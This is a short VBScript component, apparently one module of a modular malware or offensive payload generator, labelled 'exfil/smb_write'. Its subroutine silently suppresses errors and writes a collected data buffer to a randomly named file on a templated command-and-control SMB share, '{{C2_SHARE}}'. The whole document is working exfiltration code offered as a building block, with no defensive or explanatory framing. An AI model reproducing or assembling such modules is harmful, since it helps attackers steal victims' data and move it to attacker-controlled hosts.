' chunk: exfil/smb_write
' depends: core/emit_buffer, core/file_ops
' provides: exfil_smb
' format: vbscript

Sub exfil_smb()
    On Error Resume Next
    Dim dst, f
    Randomize
    dst = "{{C2_SHARE}}\exfil_" & Int(Rnd * 99999) & ".dat"
    Set f = _fso.CreateTextFile(dst, True)
    f.Write _buf
    f.Close
    On Error GoTo 0
End Sub
